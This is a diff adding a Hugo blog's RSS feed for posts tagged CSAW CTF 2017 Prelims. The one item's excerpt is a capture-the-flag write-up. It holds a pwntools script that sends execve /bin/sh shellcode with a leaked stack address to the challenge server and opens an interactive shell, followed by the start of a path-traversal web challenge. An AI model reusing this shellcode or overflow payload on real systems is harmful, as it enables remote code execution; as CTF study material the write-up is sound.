@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CSAWCTF2017Prelims on /home/rhama/</title>
+    <link>rhamaa.github.io/tags/csawctf2017prelims/</link>
+    <description>Recent content in CSAWCTF2017Prelims on /home/rhama/</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="rhamaa.github.io/tags/csawctf2017prelims/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>CSAW CTF 2017 Prelims - Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-20-csawctf-2017-quals/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-20-csawctf-2017-quals/</guid>
+      <description>#r = process(&amp;quot;./true&amp;rdquo;)r =remote(&amp;quot;pwn.chal.csaw.io&amp;quot;, 8464)r.recvuntil(&amp;quot;Location:&amp;quot;)shellcode =&amp;quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&amp;quot;payload =&amp;quot;\x90&amp;quot;*(40-len(shellcode)) payload =shellcode +payload
+addr =int(r.recv(14),16)addr =p64(addr)payload_to_send =payload+addr
+log.info(&amp;quot;Payload Length %d&amp;quot;%(len(payload_to_send)))r.sendlineafter(&amp;quot;Command:&amp;quot;,payload_to_send)r.interactive()I wrote a little proxy program inNodeJS formy poems folder.
+Everyone wants to read flag.txt but I like it too much to share.
+http://web.chal.csaw.io:7311/?path=orange.txt</description>
+    </item>
+    
+  </channel>
+</rss>
